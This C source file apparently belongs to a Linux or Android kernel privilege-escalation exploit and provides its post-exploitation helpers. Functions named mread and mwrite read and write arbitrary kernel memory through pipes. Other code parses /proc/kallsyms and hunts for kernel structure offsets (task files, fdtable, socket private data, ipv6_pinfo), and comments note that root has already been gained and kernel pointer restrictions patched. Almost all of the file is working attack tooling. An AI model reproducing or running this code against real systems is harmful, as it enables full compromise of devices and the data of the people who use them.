#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include "util.h"

struct file_info finfo = {
    .fdtab_offset = 0,
    .fd_offset = 0,
};

struct socket_info sinfo = {
    .pinet6_offset = 0,
};

int kallsyms_num = 0;
struct sym_info *kallsyms = NULL;

int mread(char *des, char *addr, size_t n) {
    int p[2];
    int ret;
    int rpipe;
    int wpipe;

    if (pipe(p) == -1) {
        perror("pipe");
        return -1;
    }
    rpipe = p[0];
    wpipe = p[1];

    ret = write(wpipe, addr, n);
    if (ret == -1) {
        perror("[!] mread write");
        close(wpipe);
        close(rpipe);
        return -1;
    }

    close(wpipe);
    ret = read(rpipe, des, n);
    if (ret < 0) {
        perror("[!] mread read");
        close(rpipe);
        return -1;
    }
    close(rpipe);
    return 0;
}

int mwrite(char *src, char *addr, size_t n) {
    int p[2];
    int ret;
    int rpipe;
    int wpipe;

    if (pipe(p) == -1) {
        perror("pipe");
        return -1;
    }
    rpipe = p[0];
    wpipe = p[1];

    ret = write(wpipe, src, n);
    if (ret == -1) {
        perror("[!] mwrite write");
        close(rpipe);
        close(wpipe);
        return -1;
    }

    close(wpipe);
    ret = read(rpipe, addr, n);
    if (ret < 0) {
        perror("[!] mwrite read");
        close(rpipe);
        return -1;
    }
    close(rpipe);
    return 0;
}

void dump_hex(const void* data, size_t size, char *addr) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    printf("                                      MEMORY DUMP\n");
    printf("==========================================================================================\n");
    for (i = 0; i < size; ++i) {
        if (i % 16 == 0) {
            printf("0x%016lx | ", (uint64_t) (addr + i));
        }
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
    printf("==========================================================================================\n");
}

// when we are locating files, we should have elevated to root
// and kptr_restric have been patched
int locate_files() {
    int ret;
    uint64_t init_files;
    int i, j;
    char buf[PAGE_SIZE];
    int found = 0;

    // located file offset using init_files
    if (info.loc_init_files == NULL) {
        ret = get_symaddr("init_files", &init_files);
        if (ret == -1) {
            printf("[!] can't find init_files in kallsyms\n");
            return -1;
        }
        printf("[+] init_files at 0x%lx\n", init_files);
        info.loc_init_files = (char *) init_files;
    }
    if (info.file_offset == 0) {
        ret = mread(buf, info.loc_init_task, sizeof(buf));
        if (ret == -1) {
            printf("[!] mread locate_files init_task failed\n");
            return -1; 
        }
        for (i = 0; i < sizeof(buf); i += incr) {
            if (*((uint64_t *) (buf + i)) == (uint64_t) info.loc_init_files) {
                found = 1;
                break;
            }
        }
        if (!found) {
            printf("[!] can't locate file offset in init_task\n");
            return -1; 
        }
        printf("[+] file_offset at %d\n", i);
        info.file_offset = i;
    }
    // locate fdarray offset using fdtab, fdt and max_fds
    if (finfo.fdtab_offset == 0) {
        found = 0;
        ret = mread(buf, info.loc_init_files, sizeof(buf));
        if (ret == -1) {
            perror("[!] mread locate_files init_files failed");
            return -1; 
        }
        for (i = 0; i < sizeof(buf); i += incr) {
            // fdt points to the next address in memory fdtab for init task
            // fd array pointer should be the first couple fields
            if (*(uint64_t *) (buf + i) == (uint64_t) (info.loc_init_files + i + incr)) {
                // fdtable is next pointer
                // now find fd pointer inside fdtable
                for (j = 0; j < sizeof(void *) * 3; j += incr) {
                    if (IS_KERNEL_PTR(*((uint64_t *) (buf + i + incr + j)))) {
                        found = 1;
                        break;
                    }
                }
                if (found != 1) {
                    printf("[!] false positive for fdtab\n");
                    continue;
                }
                break;
            }
        }
        if (!found) {
            printf("[!] can't locate fdarray offset\n");
            return -1;
        }
        finfo.fdtab_offset = i;
        finfo.fd_offset = j;
        printf("[+] fdtab_offset at %d, fdarray at %d\n", finfo.fdtab_offset, finfo.fd_offset);
    }
    return 0;
}

int get_files(char *task, char **files) {
    char *task_files;
    char *fdtable;
    int ret;
    
    ret = mread((char *) &task_files, task + info.file_offset, sizeof(task_files));
    if (ret == -1) {
        perror("[!] mread get_files task_files failed");
        return -1;
    }
    // dereference struct files_struct to get the real fdtable address
    ret = mread((char *) &fdtable, (char *) (task_files + finfo.fdtab_offset), sizeof(fdtable));
    if (ret == -1) {
        perror("[!] mread get_files fdtable failed");
    }
    // now dereference fdtable to get the real fdarray address
    ret = mread((char *) files, (char *) (fdtable + finfo.fd_offset), sizeof(*files));
    if (ret == -1) {
        perror("[!] mread get_files fdarray failed");
    }
    return 0;
}

// locate private data offset using socket 
// if our file is a socket, then it contains a pointer back to file
int locate_private_data(int fd, char **private_data) {
    int ret;
    char buf[PAGE_SIZE];
    char *files;
    int i;
    char *socket_file;
    char *cand;

    ret = get_files(info.loc_curr_task, &files);
    if (ret == -1) {
        printf("[!] get_files locate_private_data failed\n");
        return -1;
    }
     
    printf("[+] current task files at %p\n", files);
    ret = mread((char *) &files, files + fd * incr, sizeof(files));
    if (ret == -1) {
        printf("[!] mread locate_private_data files struct read failed\n");
    }
    printf("[+] file %d at %p\n", fd, files);
    ret = mread(buf, files, sizeof(buf));
    if (ret == -1) {
        printf("[!] mread locate_private_data failed\n");
        return -1;
    }

    if (finfo.privatedata_offset == 0) {
        for (i = 0; i < sizeof(buf); i += incr) {
            cand = (char *) *((uint64_t *) (buf + i));
            if (IS_KERNEL_PTR(cand)) {
                mread((char *) &socket_file, (char *) &(((struct socket *) cand)->file), sizeof(socket_file));
                if (socket_file == files) {
                    finfo.privatedata_offset = i;
                    printf("[+] found private data at %d\n", i);
                    ret = mread((char *) private_data, files + finfo.privatedata_offset, sizeof(*private_data));
                    if (ret == -1) {
                        perror("[!] mread locate_private_data private_data");
                        return -1;
                    }
                    return 0;
                }
            }
        }
    } else {
        ret = mread((char *) private_data, files + finfo.privatedata_offset, sizeof(*private_data));
        if (ret == -1) {
            perror("[!] mread locate_private_data private_data");
            return -1;
        }
        return 0;
    }
    return -1;
}

int get_sock(int fd, char **sock) {
    char *private_data;
    int ret;

    ret = locate_private_data(fd, &private_data);
    if (ret == -1) {
        printf("[!] can't locate private data\n");
        return -1;
    }
    ret = mread((char *) sock, (char *) &(((struct socket *) private_data)->sk), sizeof(*sock));
    if (ret == -1) {
        perror("[!] mread get_sock sock");
    }
    return 0;
}

// locate ipv6_pinfo by finding inet_sock_destruct in the structure
int get_ipv6_pinfo(int fd, char **pinet6) {
    int ret;  
    uint64_t inet_sock_destruct;
    char *sock = NULL;
    char buf[PAGE_SIZE];
    uint64_t curr_pinet6;
    char *destruct;

    ret = get_sock(fd, &sock);
    if (ret == -1) {
        printf("[!] can't find socket for fd %d\n", fd);
        return -1;
    }
    if (sinfo.pinet6_offset == 0) {
        ret = get_symaddr("inet_sock_destruct", &inet_sock_destruct);
        if (ret == -1) {
            printf("[!] can't find inet_sock_destruct\n");
            return -1;
        }
        printf("[+] inet_sock_destruct at 0x%lx\n", inet_sock_destruct);
        ret = mread(buf, sock, sizeof(buf));
        if (ret == -1) {
            perror("[!] mread get_ipv6_pinfo sock struct");
            return -1;
        }
        destruct = (char *) memmem(buf, sizeof(buf), (void *) &inet_sock_destruct, sizeof(uint64_t));
        if (destruct == NULL) {
            printf("[!] can't locate sk_destruct\n");
            return -1;
        }
        sinfo.pinet6_offset = (int) (destruct + incr - buf);
        printf("[+] ipv6_pinfo at %d\n",  sinfo.pinet6_offset);
    }
    ret = mread((char *) &curr_pinet6, sock + sinfo.pinet6_offset, sizeof(curr_pinet6));
    if (ret == -1) {
        perror("[!] mread get_ipv6_pinfo");
        return -1;
    }
    *pinet6 = (char *) curr_pinet6;
    return 0;
}

int dump(char * addr) {
    char buf[256];
    int ret;

    memset(buf, 0, sizeof(buf));
    ret = mread(buf, addr, sizeof(buf));
    if (ret == -1) {
        perror("[!] dump mread");
        return -1;
    }
    dump_hex(buf, sizeof(buf), addr);
    return 0;
}

int get_symaddr(const char *name, uint64_t *addr) {
    int i;

    for (i = 0; i < kallsyms_num; i++) {
        if (!strcmp(name, kallsyms[i].name)) {
            *addr = kallsyms[i].addr;
            return 0;
        }
    }
    return -1;
}

int count_lines(FILE *fp) {
    int num_lines = 0;
    char *line = NULL;
    size_t len = 0;
    ssize_t nread;

    // count_lines
    while ((nread = getline(&line, &len, fp)) != -1) {
        num_lines += 1;
    }
    free(line);
    rewind(fp);
    return num_lines;
}

int propagate_syms_info() {
    char *line = NULL;
    size_t len = 0;
    ssize_t nread;
    char unused;
    int indx = 0;
    uint64_t addr;
    char name[256];

    if (kallsyms == NULL) {
        FILE *fp = fopen("/proc/kallsyms", "r");
        if (fp == NULL) {
            perror("[!] can't open kallsyms for reading");
            return -1;
        }
        printf("[.] propagating kallsyms symbols\n");
        kallsyms_num = count_lines(fp);
        printf("[+] total %d kernel symbols\n", kallsyms_num);
        kallsyms = malloc(kallsyms_num * sizeof(struct sym_info));
        if (kallsyms == NULL) {
            printf("[!] kallsyms allocation failed\n");
            return -1;
        }
        while ((nread = getline(&line, &len, fp)) != -1) {
            memset(name, 0, sizeof(name));
            if (sscanf(line, "%lx %c %256s", &addr, &unused, name) == 3) {
                indx += 1;
                kallsyms[indx].addr = addr;
                strncpy(kallsyms[indx].name, name, sizeof(kallsyms[indx].name));
            } else {
                printf("[!] can't parse line %s\n", line);
                free(kallsyms);
                return -1;
            }
        }
        printf("[+] kallsyms propagted\n");
        free(line);
        return 0; 
    }
    printf("[+] kallsyms propagated\n");
    return 0;
}

inline void kallsyms_destruct() {
    free(kallsyms);
}
